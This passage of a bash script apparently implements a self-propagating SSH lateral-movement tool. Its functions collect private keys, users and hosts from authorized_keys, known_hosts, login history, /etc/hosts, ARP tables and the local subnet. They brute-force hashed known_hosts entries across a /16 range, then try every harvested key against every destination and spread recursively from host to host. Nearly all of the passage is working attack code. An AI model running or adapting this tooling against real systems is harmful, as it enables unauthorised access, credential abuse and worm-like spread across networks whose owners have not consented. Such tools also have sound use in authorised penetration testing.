then\n      basename -- \"$home_folder\"\n      return\n    fi\n  done\n}\n\n# authorized_keys may contain restrictions such as from=\"host,host2\". Extract that host.\n# If the file comes from a home directory, also extract the username and turn it into a destination.\nfind_from_authorized_keys() {\n  local ssh_file\n\n  for ssh_file in \"${!ssh_files[@]}\"; do\n    local ssh_address\n    local home_user\n\n    [[ -z \"$ssh_file\" ]] && continue\n\n    home_user=\"$(find_user_from_file \"$ssh_file\")\"\n\n    while IFS= read -r ssh_address; do\n      local ssh_host\n\n      [[ -z \"$ssh_address\" ]] && continue\n      while IFS= read -r ssh_host; do\n        add_ssh_host \"$ssh_host\"\n        [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\n      done < <(echo \"$ssh_address\" | awk -F\"\\\\\\'|\\\\\\\"\" '{print $2}' | tr ',' '\\n' | sort | uniq)\n    done < <(${s} grep -F 'from=' -- \"$ssh_file\" 2>/dev/null | awk -F\"\\\\\\'|\\\\\\\"\" '{print $2}' | tr ',' '\\n' | sort | uniq)\n  done\n}\n\n# Find any hosts that have previously ssh'd into this dest. Guess that the username they're sshing to here is the same as where they're coming from (naively).\nfind_from_last() {\n  local ssh_dest\n\n  last -aiw >/dev/null 2>&1 || return\n\n  while IFS= read -r ssh_dest; do\n    add_ssh_dest \"$ssh_dest\"\n  done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\\./ {print $1\":\"$NF}' | sort | uniq)\n\n}\n\n# known_hosts contains a list of hosts that have previously been connected to.\n# On some systems, the host values are not hashed, and we can extract them.\n# An example looks like:\n# 2048 MD5:32:41:b4:e7:3e:d7:ee:a4:3a:c3:a8:44:40:45:16:04 192.168.1.1 (RSA)\n#\n# Incidentally, this will also scan authorized_keys files, which may look like this:\n# 2048 MD5:62:38:9a:f0:6d:e7:57:57:25:09:71:4d:c7:bb:4b:b0 root@server (RSA)\n# Thus we can also add root@server to our list of destinations.\nfind_from_known_hosts() {\n  local ssh_file\n\n  for ssh_file in \"${!ssh_files[@]}\"; do\n    local known_host_line\n    local home_user\n\n    home_user=\"$(find_user_from_file \"$ssh_file\")\"\n\n    while IFS= read -r known_host_line; do\n      local ssh_host\n      local ssh_user\n      local ssh_dest\n\n      [[ -z \"$known_host_line\" ]] && continue\n\n      ssh_user=\"$(echo \"$known_host_line\" | grep -F -m 1 '@' | awk -F\"@\" '{print $1}')\"\n      ssh_host=\"$(echo \"$known_host_line\" | grep -F -m 1 -v '@')\"\n      ssh_dest=\"$(echo \"$known_host_line\" | grep -m 1 -oE \"$allowed_users_chars\"'@[^ :]+')\"\n\n      add_ssh_user \"$ssh_user\"\n      add_ssh_host \"$ssh_host\"\n      add_ssh_dest \"$ssh_dest\"\n\n      [[ -n \"$home_user\" && -n \"$ssh_host\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\n    done < <(${s} \"${sshkeygen[@]}\" \"$ssh_file\" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort | uniq)\n  done\n}\n\n# /etc/hosts and other static hosts may be interesting.\nfind_from_hosts() {\n  local ssh_host\n\n  while IFS= read -r ssh_host; do\n    add_ssh_host \"$ssh_host\"\n  done < <(getent ahostsv4 2>/dev/null | awk -F\"  \" '{print $NF}' | tr ' ' '\\n' | sort | uniq) # skip ipv6 for now, might be tab.\n\n  while IFS=\": \" read -r _ ssh_host; do\n    add_ssh_host \"$ssh_host\"\n  done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort | uniq)\n}\n\n# Neighbouring hosts that announce themselves via ARP may be interesting.\nfind_arp_neighbours() {\n  local ssh_host\n\n  while IFS= read -r ssh_host; do\n    add_ssh_host \"$ssh_host\"\n  done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\\.1$|:)/ {print $1}' | sort | uniq) # ignore ipv6 and ignore gateway\n\n  while IFS= read -r ssh_host; do\n    add_ssh_host \"$ssh_host\"\n  done < <(arp -a 2>/dev/null | awk -F\"\\\\\\(|\\\\\\)\" '{print $2}' | awk '$1 !~ /(\\.1$|:)/ {print $1}' | sort | uniq) # ignore ipv6 and ignore gateway\n}\n\n# Neighbouring d-block hosts (x.x.x.0-x.x.x.255) may be interesting.\nfind_d_block() {\n  local octets\n  local i\n  local current_ip\n\n  for current_ip in \"${!current_ips[@]}\"; do\n    IFS='.' read -ra octets < <(echo \"$current_ip\")\n\n    # Might be an unknown ip address.\n    [[ ${#octets[@]} -eq 4 ]] || continue\n\n    for ((i=0; i<256; i++)); do\n      add_ssh_host \"${octets[0]}.${octets[1]}.${octets[2]}.$i\"\n    done\n  done\n}\n\n# It may be interesting to attempt to SSH back to the same destination that we initially connected from.\n# We determine where we came from using the chain and parsing the second-last entry (the last one being THIS host).\n# We also add $SSH_CONNECTIONS and $this_dest, which if it differs, mean we're being forwarded somewhere else (so, check all).\nfind_from_prev_dest() {\n  local chain_sl_dest\n  local ssh_user\n  local ssh_host\n\n  chain_sl_dest=\"${hosts_chain%[*}\"\n  chain_sl_dest=\"${chain_sl_dest##*->}\"\n\n  add_ssh_dest \"$chain_sl_dest\"\n\n  add_ssh_dest \"$this_dest\"\n\n  [[ -z \"$SSH_CONNECTION\" ]] && return\n\n  ssh_host=\"${SSH_CONNECTION%% *}\"\n  add_ssh_host \"$ssh_host\"\n}\n\n# Read the ignore list and load destinations from the ignore list (aka which have already been connected to from some other host) into ssh_dests.\nfind_from_ignore_list() {\n  local ssh_dest\n\n  for ssh_dest in \"${!ignore_list_array[@]}\"; do\n    add_ssh_dest \"$ssh_dest\"\n  done\n}\n\n# By default, most Debian-based OS' use ssh_config's HashKnownHosts, which hashes the hosts that are SSH'd to.\n# For example, using `ssh 192.168.1.1`, known_hosts will list `|1|+iwCSCtqbUdZJgeteQqYgQ0hWG8=|a3AyqEIKC7R4uDQsAv8zI1yIGpU=` as the hostname.\n# We can attempt to crack these hashes by using ssh-keygen -F, which provided a host, will print if it is in the known_hosts file.\n# Since we need to actually know the hosts in order to test them, we can try brute-forcing c and d-blocks of the local ip address.\n# For example, if we are 10.5.3.2, we can search for 10.5.0.0-10.5.255.255.\n# We also add the $user@$host to destinations, where $user is the home folder corresponding to where the known_hosts file was found.\n#\n# If xargs is not available, we fall back to manually checking the range in a double for loop.\n#\n# This is EXTREMELY slow, and even slower when using sudo. Here are some benchmarks:\n# xargs: 2m42.820s\n# for-loop: 7m52.145s\n# sudo xargs: 3m56.659s\n# sudo for-loop: 15m36.738s\n#\n# Therefore, this should be used only in extreme cases.\nfind_from_hashed_known_hosts() {\n  local octets\n  local ssh_file\n  local current_ip\n\n  for ssh_file in \"${!ssh_files[@]}\"; do\n    local hashed_number\n    local home_user\n    local ssh_host\n    local i\n    local j\n    local ss\n\n    [[ -z \"$ssh_file\" ]] && continue\n\n    ss=\"\"\n    # Don't use sudo unless we have to.\n    [[ ! -r \"$ssh_file\" ]] && ss=\"$s\"\n\n    home_user=\"$(find_user_from_file \"$ssh_file\")\"\n\n    # Determine how many (if any) hashed known hosts are in the file.\n    hashed_number=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" 2>/dev/null | grep -Ec ':[a-zA-Z0-9]{2} \\|1\\|')\"\n\n    # break if there are no hashed known hosts left\n    [[ $hashed_number -lt 1 ]] && continue\n\n    # Check all of the current ssh_hosts against all of the hashed known hosts.\n    # ssh_hosts includes all ssh_dests already, so no need to parse ssh_dests.\n    for ssh_host in \"${!ssh_hosts[@]}\"; do\n      local found_hosts_count\n\n      found_hosts_count=0\n\n      # break if there are no hashed known hosts left.\n      [[ $hashed_number -lt 1 ]] && break\n\n      found_hosts_count=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" -F \"$ssh_host\" 2>/dev/null | grep -cE 'Host .* found')\" && ((hashed_number -= found_hosts_count)) && [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\n    done\n\n    # break if there are no hashed known hosts left.\n    [[ $hashed_number -lt 1 ]] && continue\n\n    # Check all of the ignore_list hosts against all of the hashed known hosts.\n    for ssh_dest in \"${!ignore_list_array[@]}\"; do\n      local found_hosts_count\n\n      found_hosts_count=0\n\n      # break if there are no hashed known hosts left.\n\n      [[ $hashed_number -lt 1 ]] && break\n\n      ssh_host=\"${ssh_dest#*@}\"\n      found_hosts_count=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" -F \"$ssh_host\" 2>/dev/null | grep -cE 'Host .* found')\" && ((hashed_number -= found_hosts_count)) && [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\n    done\n\n    # break if there are no hashed known hosts left.\n    [[ $hashed_number -lt 1 ]] && continue\n\n    # Finally, start brute forcing.\n\n    # use xargs if possible\n    for current_ip in \"${!current_ips[@]}\"; do\n      # break if there are no hashed known hosts left.\n      [[ $hashed_number -lt 1 ]] && break\n\n      IFS='.' read -ra octets < <(echo \"$current_ip\")\n      [[ ${#octets[@]} -eq 4 ]] || continue\n\n      if command -v xargs >/dev/null 2>&1; then\n        for i in {0..255}; do\n          # break if there are no hashed known hosts left.\n          [[ $hashed_number -lt 1 ]] && break\n          while IFS= read -r ssh_host; do\n            ssh_host=\"${ssh_host#*Host }\"\n            ssh_host=\"${ssh_host%% found*}\"\n            add_ssh_host \"$ssh_host\"\n            ((hashed_number--))\n            [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\n          done < <(\n            for j in {0..255}; do\n              echo \"${octets[0]}.${octets[1]}.$j.$i\"\n            done | xargs -P 0 -n 1 ${ss} ssh-keygen -f \"$ssh_file\" -F 2>/dev/null | grep -F '# Host')\n        done\n      else\n        for ((i=0; i<256; i++)); do\n          # break if there are no hashed known hosts left.\n          [[ $hashed_number -lt 1 ]] && break\n          for ((j=0; j<256; j++)); do\n            local found_hosts_count\n\n            found_hosts_count=0\n\n            # break if there are no hashed known hosts left.\n            [[ $hashed_number -lt 1 ]] && break\n\n            ssh_host=\"${octets[0]}.${octets[1]}.$i.$j\"\n            [[ -v 'ssh_hosts[\"$ssh_host\"]' || ${#ssh_hosts[\"$ssh_host\"]} -gt 0 ]] && continue # Skip this because we have already tried it earlier.\n\n            found_hosts_count=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" -F \"$ssh_host\" 2>/dev/null | grep -cE 'Host .* found')\" && ((hashed_number -= found_hosts_count)) && [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\n          done\n        done\n      fi\n    done\n  done\n}\n\n# Find: home folders, SSH-related files, SSH keys, SSH users, SSH hosts, SSH dests.\nfind_all() {\n  retry_all_dests\n  find_home_folders\n  init_ssh_files\n\n  find_ssh_keys\n  find_ssh_keys_paths\n  find_from_bash_history\n  find_from_ssh_config\n\n  (( ${#priv_keys[@]} )) || fin\n\n  # None of the following strategies discover keys.\n\n  find_from_authorized_keys\n  find_from_last\n  find_from_known_hosts\n  find_from_hosts\n  find_arp_neighbours\n  find_d_block\n  find_from_prev_dest\n  find_from_ignore_list\n\n  find_from_hashed_known_hosts # Should always be last as it relies on ssh_hosts being filled.\n}\n\n# If use_combinate_users_hosts_aggressive is enabled, combinate all:\n# ssh_hosts and interesting_hosts\n# ssh_users and interesting_users\n#\n# Then, join all ssh_users@ssh_hosts.\ncombinate_users_hosts_aggressive() {\n  local ssh_user\n  local ssh_host\n\n  for ssh_host in \"${interesting_hosts[@]}\"; do\n    add_ssh_host \"$ssh_host\"\n  done\n\n  for ssh_user in \"${interesting_users[@]}\"; do\n    add_ssh_user \"$ssh_user\"\n  done\n\n  for ssh_dest in \"${interesting_dests[@]}\"; do\n    add_ssh_dest \"$ssh_dest\"\n  done\n\n  for ssh_host in \"${!ssh_hosts[@]}\"; do\n    for ssh_user in \"${!ssh_users[@]}\"; do\n      add_ssh_dest \"$ssh_user@$ssh_host\"\n    done\n  done\n}\n\n# Add any interesting dests, combine any interesting users with all hosts, any interesting hosts with all users, and interesting hosts with interesting users.\ncombinate_interesting_users_hosts() {\n  local ssh_user\n  local ssh_host\n\n  for ssh_dest in \"${interesting_dests[@]}\"; do\n    add_ssh_dest \"$ssh_dest\"\n  done\n\n  for ssh_user in \"${interesting_users[@]}\"; do\n    add_ssh_user \"$ssh_user\"\n    for ssh_host in \"${!ssh_hosts[@]}\"; do\n      add_ssh_dest \"$ssh_user@$ssh_host\"\n    done\n  done\n\n  for ssh_host in \"${interesting_hosts[@]}\"; do\n    add_ssh_host \"$ssh_host\"\n    for ssh_user in \"${!ssh_users[@]}\"; do\n      add_ssh_dest \"$ssh_user@$ssh_host\"\n    done\n  done\n\n  for ssh_host in \"${interesting_hosts[@]}\"; do\n    for ssh_user in \"${interesting_users[@]}\"; do\n      add_ssh_dest \"$ssh_user@$ssh_host\"\n    done\n  done\n}\n\n# Deduplicate ssh_dests by resolving the hosts for each ssh_dest, checking whether the user, host, or resolved dest is ignored, then adding the destinations back to the original ssh_dests array.\ndeduplicate_resolved_hosts_keys() {\n  local ssh_dest\n  declare -A valid_ssh_dests\n  declare -A resolved_hosts\n  local res\n  local use_mac\n  local to\n\n  # DNS timeout of 5 seconds per address (bleh, hack).\n  command -v timeout >/dev/null 2>&1 && to=\"timeout $ssh_timeout\"\n\n  # Use getent if it's available.\n  if getent ahostsv4 -- 1.1.1.1 >/dev/null 2>&1; then\n    res=\"$to getent ahostsv4 --\"\n  # Otherwise dscacheutils for mac.\n  elif dscacheutil -q host -a name 1.1.1.1 >/dev/null 2>&1; then\n    res=\"$to dscacheutil -q host -a name\"\n    use_mac=\"1\"\n  else\n    # If we can't use getent or dscacheutil, we're on an unknown type of system (with bash?!)\n    # Use printf instead of chained_print() to be consistent.\n    printf \"INTERNAL_MSG: command not found: RESOLVE (%s)\\n\" \"$(uname -a 2>/dev/null)\"\n    fin\n  fi\n\n  # Pre-resolve each host concurrently in the hope that the answers will be cached.\n  for ssh_dest in \"${!ssh_dests[@]}\"; do\n    local ssh_host\n\n    is_ssh_dest \"$ssh_dest\" || continue\n    ssh_host=\"${ssh_dest#*@}\"\n    [[ -v 'resolved_hosts[\"$ssh_host\"]' || ${#resolved_hosts[\"$ssh_host\"]} -gt 0 ]] && continue\n\n     resolved_hosts[\"$ssh_host\"]=1\n    ($res \"$ssh_host\" > /dev/null 2>&1 &)\n  done\n\n  wait\n\n  resolved_hosts=()\n\n  for ssh_dest in \"${!ssh_dests[@]}\"; do\n    local ssh_user\n    local ssh_host\n    local resolved_ssh_host\n\n    is_ssh_dest \"$ssh_dest\" || continue # Checks if the host has been ignored in this loop\n\n    ssh_user=\"${ssh_dest%%@*}\"\n    ssh_host=\"${ssh_dest#*@}\"\n\n    # Check if the host has already been resolved. If it has, use the internally cached answer.\n    if [[ -v 'resolved_hosts[\"$ssh_host\"]' || ${#resolved_hosts[\"$ssh_host\"]} -gt 0 ]]; then\n      :\n    else\n      # If the host has not already been resolved, resolve it.\n      # If resolution of ${resolved_hosts[\"$ssh_host\"]} failed before, we won't hit this code path because the host will be added to _ignored_hosts (and will be skipped using is_ssh_dest().\n      # macos\n      local resolved_ssh_hosts # list of ipv4 addresses for a host\n      if [[ -n \"$use_mac\" ]]; then\n        resolved_ssh_hosts=\"$($res \"$ssh_host\" 2>/dev/null | awk '/ip_address:/{print $NF}')\"\n      else\n      # linux\n        resolved_ssh_hosts=\"$($res \"$ssh_host\" 2>/dev/null | awk '/RAW/{print $1}')\"\n      fi\n\n      for resolved_ssh_host in \"${resolved_ssh_hosts[@]}\"; do\n        # Answer must begin with 1 or 2 ($res 0.1.2.3 will respond with 0.1.2.3).\n        if [[ \"${resolved_ssh_host:0:1}\" =~ [12] ]]; then\n          [[ \"$resolved_ssh_host\" =~ ^127\\. ]] && resolved_ssh_host=\"127.0.0.1\" # If it's loopback, always use 127.0.0.1\n          [[ -v '_ignored_hosts[\"$resolved_ssh_host\"]' || ${#_ignored_hosts[\"$resolved_ssh_host\"]} -gt 0 ]] && continue\n          # Cache the host\n          resolved_hosts[\"$ssh_host\"]+=\"$resolved_ssh_host \"\n        else\n          # Ignore this RESOLVED host (might save us a few cycles).\n          # Don't add the ssh_host to _ignored_hosts become it may have non-ignored hosts, too.\n          [[ -n \"$resolved_ssh_host\" ]] && _ignored_hosts[\"$resolved_ssh_host\"]=1\n        fi\n      done\n    fi\n\n    # No IPs resolved for the host, add the host to _ignored_host.\n    if [[ \"${#resolved_hosts[\"$ssh_host\"]}\" -lt 7 ]]; then\n      _ignored_hosts[\"$ssh_host\"]=1\n      continue\n    fi\n\n    # Loop through each host (which are space-separated now), so no quotation marks.\n    for resolved_ssh_host in ${resolved_hosts[\"$ssh_host\"]}; do\n      valid_ssh_dests[\"$ssh_user@$resolved_ssh_host\"]=1\n    done\n  done\n\n  ssh_dests=()\n\n  for ssh_dest in \"${!valid_ssh_dests[@]}\"; do\n    add_ssh_dest \"$ssh_dest\"\n  done\n}\n\n# Check whether a file is a real file, exists, contains something, and is readable.\nis_file() {\n  local filename\n\n  filename=\"$1\"\n\n  [[ -z \"$filename\" ]] && return 1\n\n  [[ -v 'files[\"$filename\"]' || ${#files[\"$filename\"]} -gt 0 ]] && return 0\n  [[ -v 'not_files[\"$filename\"]' || ${#not_files[\"$filename\"]} -gt 0 ]] && return 1\n\n  ${s} test -s \"$filename\" && ${s} test -r \"$filename\" && ${s} test -f \"$filename\" && files[\"$filename\"]=1 && return 0\n\n  not_files[\"$filename\"]=1\n  return 1\n}\n\n# Checks whether a folder is a real folder, and is readable.\nis_dir() {\n  local dir_name\n\n  dir_name=\"$1\"\n\n  [[ -z \"$dir_name\" ]] && return 1\n\n  [[ -v 'folders[\"$dir_name\"]' || ${#folders[\"$dir_name\"]} -gt 0 ]] && return 0\n  [[ -v 'not_folders[\"$dir_name\"]' || ${#not_folders[\"$dir_name\"]} -gt 0 ]] && return 1\n\n  ${s} test -d \"$dir_name\" && ${s} test -r \"$dir_name\" && folders[\"$dir_name\"]=1 && return 0\n\n  not_folders[\"$dir_name\"]=1\n  return 1\n}\n\n# Checks whether a string is a candidate for an ssh user.\nis_ssh_user() {\n  local ssh_user\n\n  ssh_user=\"$1\"\n\n  [[ -z \"$ssh_user\" ]] && return 1\n\n  [[ -v '_ignored_users[\"$ssh_user\"]' || ${#_ignored_users[\"$ssh_user\"]} -gt 0 ]] && return 1\n\n  [[ -v 'ssh_users[\"$ssh_user\"]' || ${#ssh_users[\"$ssh_user\"]} -gt 0 ]] && return 0\n\n  [[ \"$ssh_user\" =~ ^$allowed_users_chars$ ]] || return 1\n\n  return 0\n}\n\n# Checks whether a string is a candidate for an ssh host.\nis_ssh_host() {\n  local ssh_host\n\n  ssh_host=\"$1\"\n\n  [[ -z \"$ssh_host\" ]] && return 1\n\n  [[ -v '_ignored_hosts[\"$ssh_host\"]' || ${#_ignored_hosts[\"$ssh_host\"]} -gt 0 ]] && return 1\n\n  [[ -v 'ssh_hosts[\"$ssh_host\"]' || ${#ssh_hosts[\"$ssh_host\"]} -gt 0 ]] && return 0\n\n  [[ \"$ssh_host\" =~ ^$allowed_host_chars+$ ]] || return 1\n\n  [[ \"${ssh_host:0:1}\" == \"-\" || \"${ssh_host:0-1}\" == \"-\" || \"${ssh_host:0:1}\" == \".\" || \"${ssh_host:0-1}\" == \".\" || \"$ssh_host\" == *\"-.\"* || \"$ssh_host\" == *\"--\"* ]] && return 1\n\n  if [[ \"$ssh_host\" =~ ^[0-9.]+$ ]]; then\n    [[ \"$ssh_host\" =~ ^[0-9]+(\\.[0-9]+){3}$ ]] || return 1\n  fi\n\n  return 0\n}\n\n# Checks whether a string is a candidate for an ssh dest.\nis_ssh_dest() {\n  local ssh_user\n  local ssh_host\n  local ssh_dest\n\n  ssh_dest=\"$1\"\n\n  [[ -z \"$ssh_dest\" ]] && return 1\n\n  ssh_dest=\"${ssh_dest,,}\"\n\n  # XXX: The below line is intrinsically flawed because even if $ssh_dest is already in ssh_dests, this does not mean $ssh_host has not been added to $_ignored_hosts. We keep it here to remember not to add it again.\n  # [[ -v 'ssh_dests[\"$ssh_dest\"]' || ${#ssh_dests[\"$ssh_dest\"]} -gt 0 ]] && return 0\n\n  [[ -v '_ignored_dests[\"$ssh_dest\"]' || ${#_ignored_dests[\"$ssh_dest\"]} -gt 0 ]] && return 1\n\n  ssh_user=\"${ssh_dest%%@*}\"\n  ssh_host=\"${ssh_dest#*@}\"\n\n  is_ssh_host \"$ssh_host\" && is_ssh_user \"$ssh_user\" && return 0\n\n  return 1\n}\n\n# Add to ssh_users if it's a user.\nadd_ssh_user() {\n  local ssh_user\n\n  ssh_user=\"$1\"\n  is_ssh_user \"$ssh_user\" && ssh_users[\"$ssh_user\"]=1 && return 0\n\n  return 1\n}\n\n# Add to ssh_hosts if it's a host.\nadd_ssh_host() {\n  local ssh_host\n\n  ssh_host=\"$1\"\n  is_ssh_host \"$ssh_host\" && ssh_hosts[\"$ssh_host\"]=1 && return 0\n\n  return 1\n}\n\n# Add to ssh_dests if it's a dest.\n# Note: This also adds to ssh_hosts and ssh_users.\nadd_ssh_dest() {\n  local ssh_dest\n  local ssh_host\n  local ssh_user\n\n  ssh_dest=\"$1\"\n\n  ssh_dest=\"${ssh_dest,,}\"\n\n  ssh_user=\"${ssh_dest%%@*}\"\n  ssh_host=\"${ssh_dest#*@}\"\n\n  is_ssh_dest \"$ssh_dest\" && ssh_dests[\"$ssh_dest\"]=1 && ssh_hosts[\"$ssh_host\"]=1 && ssh_users[\"$ssh_user\"]=1 && return 0\n\n  return 1\n}\n\n# Print a line in recursive_scan beginning with the appropriate separator length and chain.\n# Since we're calling this within recursive_scan, we need to add another indentation on top of $indent, since we're emulating the next host.\n# Argument $1 is the chain to print.\n# Argument $2 is what to print after the chain. Normally, that would probably be the ssh_dest.\nrs_chained_print() {\n  printf \"%s%*s%s->%s\\n\" \"$indent\" 1 \"\" \"$1\" \"$2\"\n}\n\n# Call rs_chained_print twice, with separate chains.\n# $1 is chain 1, $2 is chain 2, and $3 is what to print\ndouble_rs_chained_print() {\n  local ssh_dest\n  local ssh_host\n  local ssh_user\n\n  ssh_dest=\"$3\"\n  ssh_user=\"${ssh_dest%%@*}\"\n  ssh_host=\"${ssh_dest#*@}\"\n\n  rs_chained_print \"$1\" \"$3\"\n  rs_chained_print \"$2\" \"$ssh_user@($ssh_host)\"\n}\n\n# The main SSH function of the script.\n# Loop through each destination, then loop through each private key file.\n# Attempt ssh on all of the valid destinations with each of the private key files.\nrecursive_scan() {\n  declare -A retry_dests\n  declare -A retry_keys\n  local ssh_dest\n  local priv_key\n  local key_file\n\n  # Loop through each destination.\n  for ssh_dest in \"${!ssh_dests[@]}\"; do\n    local ssh_user\n    local ssh_host\n\n    ssh_user=\"${ssh_dest%%@*}\"\n    ssh_host=\"${ssh_dest#*@}\"\n\n    # Check whether the host and user are valid (the host may have been added while inside this loop).\n    is_ssh_user \"$ssh_user\" || continue\n    is_ssh_host \"$ssh_host\" || continue\n\n    # Loop through each ssh key.\n    for priv_key in \"${!priv_keys[@]}\"; do\n      local t_hosts_chain\n      local t_hostnames_chain\n      local skip_this_dest\n      local line\n      local line_num\n\n      key_file=\"${priv_keys[\"$priv_key\"]}\"\n\n      # Check whether the key is still valid (it may have been added to the ignore list while inside this loop).\n      [[ -v '_ignored_key_files[\"$key_file\"]' || ${#_ignored_key_files[\"$key_file\"]} -gt 0 ]] && continue\n\n      # A $key_file is appended with ! if sudo is being used.\n      # Define the future hosts_chain\n      t_hosts_chain=\"${hosts_chain}[${s:+!}${key_file}]\"\n      # Define the future hostnames_chain\n      t_hostnames_chain=\"${hostnames_chain}[${s:+!}${key_file}]\"\n      # If set to 1, we will stop trying any new keys for this dest (aka we break).\n      skip_this_dest=0\n      # Record the amount of lines for each ssh attempt.\n      line_num=0\n\n      # Loop through each line of the SSH output one-by-one.\n      while IFS= read -r line; do\n        ((line_num++))\n        # If there is a connection error a dest, don't bother trying other keys (or other users) for the other users of the same host.\n        #\n        # ssh: Could not resolve hostname server: Name or service not known ; should never happen since we use ip addresses, but pick it up anyways.\n        # ssh: connect to host ip port 22: Connection refused\n        # ssh: connect to host ip port 22: Connection timed out\n        # ssh: connect to ip port 22: No route to ip\n        # ssh: connect to host ip port 22: Network is unreachable\n        # ssh: connect to host port 22: No route to host\n        # ssh: connect to host ip port 22: Operation timed out\n        if [[ \"$line\" == *\"resolve hostname\"* || \"$line\" == *\"connect to \"* ]]; then\n          _ignored_hosts[\"$ssh_host\"]=1\n          skip_this_dest=1\n          break\n        fi\n\n        # bash argument list too long; we can't continue, so print where we are, the maximum argument length (because why not), and the ignore_list (which is the non-static part of the script which is causing the argument list too long).\n        # It may be useful to take the ignore_list and set those ip destinations as ignored_dests.\n        if [[ \"$line\" == *\"Argument list too long\"* ]]; then\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [ARG_LIMIT:$(getconf -a 2>/dev/null | awk '/ARG_MAX/{print $NF; exit}'), $(printf \"%s\" \"$ignore_list\" | base64 | tr -d '\\n')]\"\n          printf \"INTERNAL_MSG: ARG_LIMIT\\n\"\n          fin\n        fi\n\n        # This is an unrecoverable error, so kill everything.\n        if [[ \"$line\" == \"INTERNAL_MSG: ARG_LIMIT\" ]]; then\n          printf \"INTERNAL_MSG: ARG_LIMIT\\n\"\n          fin\n        fi\n\n        # Various warnings may occur when using ssh, bash, or other programs. In general, we can simply ignore these messages as they're warnings, not errors, and we have no use for them at all.\n        #\n        # Warning: Permanently added '...' (RSA) to the list of known hosts.\n        # Permission denied (publickey,password).\n        # grep: [file]: Permission denied\n        # identity_sign: private key [file] contents do not match public\n        # load pubkey [file]: invalid format\n        # sudo: unable to resolve host\n        # warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)\n        # key_load_public: invalid format\n        if [[ \"$line\" == *\"Warning: Permanently added\"* || \"$line\" == *\"Permission denied\"* || \"$line\" == *\"contents do not match public\"* || \"$line\" == *\"load pubkey\"* || \"$line\" == *\"unable to resolve host\"* || \"$line\" == *\"warning: setlocale\"* || \"$line\" == *\"key_load_public: invalid format\"* ]]; then\n          continue\n        fi\n\n        # The HostkeyAlgorithms may not be supported. XXX: should we be reporting this? Can we somehow bypass it? Maybe we can try adding to ssh_options?\n        #\n        # Unable to negotiate with 192.168.1.1 port 22: no matching host key type found. Their offer: ssh-dss\n        if [[ \"$line\" == *\"Unable to negotiate with\"* ]]; then\n          continue\n        fi\n\n        # Various errors may occur due to an ssh key not being valid. Ignore those keys in the future.\n        #\n        # Warning: Identity file [file] not accessible: No such file or directory.\n        # Warning: Identity file [file] not accessible: Permission denied.\n        # no such identity: [file]: No such file or directory\n        # Load key [file]: invalid format\n        # Load key [file]: bad permissions\n        if [[ \"$line\" == \"Warning: Identity file\"* || \"$line\" == \"Load key\"* || \"$line\" == *\"No such file or directory\"* ]]; then\n          _ignored_key_files[\"$key_file\"]=1\n          break\n        fi\n\n        # A destination has finished scanning and we add it to the ignore list. We also propagate it.\n        # When a destination is finished scanning, it gets added to the ignore_list in all intermediate destinations.\n        # However, remember, that for: A->B->C, the ignore_list on destination \"B\" will initially be longer than the ignore_list of \"A\". This is because while we add ourself(server) to the ignore_list when starting, we don't propagate it until we have finished.\n        if [[ \"$line\" == \"INTERNAL_MSG: ignore list: \"* ]]; then\n          local ignore_new\n\n          ignore_new=\"${line#*INTERNAL_MSG: ignore list: }\"\n          if [[ \"$ignore_list\" != *\"$ignore_new\"* ]]; then\n            ignore_list+=\"$ignore_new\"\n          fi\n          printf \"%s\\n\" \"$line\"\n          continue # Don't break, as it may be being passed through from a much higher destination.\n        fi\n\n        # If a destination has been scanned but fails a check to ensure all the programs that this script needs are present, report that the destination can be SSH'd to, and the function that is missing.\n        if [[ \"$line\" == \"INTERNAL_MSG: command not found: \"* ]]; then\n          local missing_cmd\n\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n\n          missing_cmd=\"${line#*INTERNAL_MSG: command not found: }\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,cmd,$missing_cmd]\"\n          break\n        fi\n\n        # sh: bash: inaccessible or not found\n        # sh: bash: not found\n        # Bash is not available on the system.\n        if [[ \"$line\" == *\"sh: bash\"* ]]; then\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,cmd,bash]\"\n          break\n        fi\n\n        # If a destination has no memory, it is likely to crash while running this script using awk, or some other program. Catch it and report that it is out of memory.\n        if [[ \"$line\" == *\"Segmentation fault\"* || \"$line\" == *\"cannot allocate\"* || \"$line\" == *\"core dumped\"* ]]; then\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [OoM]\"\n          break\n        fi\n\n        # Shell is /usr/sbin/nologin\n        if [[ \"$line\" == *\"This account is currently not available\"* ]]; then\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [NoLogin]\"\n          break\n        fi\n\n        # Gitlab instances may be accessed, and it's quite easy to detect it. Since git uses ssh, we can record this.\n        #\n        # Disallowed command\n        if [[ \"$line\" == \"Disallowed command\" ]]; then # Gitlab\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [GitLab]\"\n          break\n        fi\n\n        # Github, too.\n        #\n        # Invalid 